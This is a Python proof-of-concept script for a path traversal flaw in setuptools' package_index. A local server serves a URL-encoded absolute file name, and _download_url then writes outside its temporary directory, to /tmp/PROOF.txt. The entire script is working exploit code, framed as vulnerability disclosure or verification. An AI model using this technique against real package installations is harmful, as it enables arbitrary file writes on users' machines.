#!/usr/bin/env python3
"""
Proof of Concept: Path Traversal Vulnerability in setuptools package_index.py

This PoC demonstrates that a malicious package index can cause setuptools
to write files to arbitrary locations by using URL-encoded absolute paths.

Vulnerability: setuptools/package_index.py:810-823
The _download_url() function does not sanitize absolute paths, allowing
os.path.join(tmpdir, "/tmp/PROOF.txt") to return "/tmp/PROOF.txt"

Run: python poc_path_traversal.py
"""

import http.server
import os
import socketserver
import tempfile
import threading
import time
from urllib.parse import quote

# Add setuptools to path
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import setuptools.package_index


# The payload that will be written
PAYLOAD = b"VULNERABLE: This file was written via path traversal in setuptools!\n"

# Target file outside any temp directory
TARGET_FILE = "/tmp/PROOF.txt"


class MaliciousHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that serves a malicious package index."""

    def log_message(self, format, *args):
        print(f"    [SERVER] {args[0]}")

    def do_GET(self):
        from urllib.parse import unquote
        decoded_path = unquote(self.path)

        print(f"    [SERVER] Request path (encoded): {self.path}")
        print(f"    [SERVER] Request path (decoded): {decoded_path}")

        # Serve the payload for any request
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Length', len(PAYLOAD))
        self.end_headers()
        self.wfile.write(PAYLOAD)

    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Length', len(PAYLOAD))
        self.end_headers()


def start_malicious_server():
    """Start a malicious HTTP server on a random available port."""
    handler = MaliciousHandler

    # Use port 0 to get a random available port
    httpd = socketserver.TCPServer(("127.0.0.1", 0), handler)
    port = httpd.server_address[1]

    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()

    return httpd, port


def demonstrate_vulnerability():
    """Demonstrate the path traversal vulnerability."""

    print("=" * 70)
    print("PATH TRAVERSAL VULNERABILITY PROOF OF CONCEPT")
    print("setuptools/package_index.py:810-823")
    print("=" * 70)

    # Clean up any previous proof file
    if os.path.exists(TARGET_FILE):
        os.remove(TARGET_FILE)
        print(f"\n[*] Removed existing {TARGET_FILE}")

    # Start malicious server
    print("\n[1] Starting malicious package server...")
    server, port = start_malicious_server()
    time.sleep(0.2)
    print(f"    Server running on port {port}")

    # Create the malicious URL
    # egg_info_for_url does: path.split('/')[-1] then urllib.parse.unquote()
    # So the last path component must be the URL-encoded absolute path
    # "%2Ftmp%2FPROOF.txt" decodes to "/tmp/PROOF.txt"
    encoded_filename = quote(TARGET_FILE, safe='')  # Encode everything including /
    malicious_url = f"http://127.0.0.1:{port}/packages/{encoded_filename}"

    print(f"\n[2] Malicious URL constructed:")
    print(f"    URL: {malicious_url}")
    print(f"    Last path component: {encoded_filename}")
    print(f"    After URL decode: {TARGET_FILE}")

    # Show what egg_info_for_url will extract
    extracted_name, _ = setuptools.package_index.egg_info_for_url(malicious_url)
    print(f"\n[3] egg_info_for_url() extracts filename: {extracted_name!r}")

    # Create a legitimate temp directory where files SHOULD go
    with tempfile.TemporaryDirectory() as legitimate_tmpdir:
        print(f"\n[4] Legitimate download directory: {legitimate_tmpdir}")
        print(f"    Files SHOULD be downloaded here!")

        # Show what os.path.join will do (the vulnerability)
        would_be_path = os.path.join(legitimate_tmpdir, extracted_name)
        print(f"\n[5] os.path.join(tmpdir, '{extracted_name}') = '{would_be_path}'")
        print(f"    NOTE: tmpdir is IGNORED because filename is absolute!")

        # Create a PackageIndex and trigger the download
        print(f"\n[6] Calling PackageIndex._download_url()...")

        index = setuptools.package_index.PackageIndex()

        try:
            result = index._download_url(malicious_url, legitimate_tmpdir)
            print(f"    Returned path: {result}")
        except Exception as e:
            print(f"    Exception (file may still be written): {e}")

    # Check results
    print(f"\n[7] Checking for proof file...")

    if os.path.exists(TARGET_FILE):
        with open(TARGET_FILE, 'rb') as f:
            content = f.read()

        print("\n" + "=" * 70)
        print("✓ VULNERABILITY CONFIRMED!")
        print("=" * 70)
        print(f"\nFile successfully written to: {TARGET_FILE}")
        print(f"Content: {content.decode().strip()}")
        print(f"\nThe file was written OUTSIDE the legitimate temp directory!")
        print("This proves arbitrary file write via path traversal.\n")

        os.system(f"ls -la {TARGET_FILE}")

        return True
    else:
        print(f"\n✗ File was NOT created at {TARGET_FILE}")
        return False


if __name__ == "__main__":
    success = demonstrate_vulnerability()
    sys.exit(0 if success else 1)
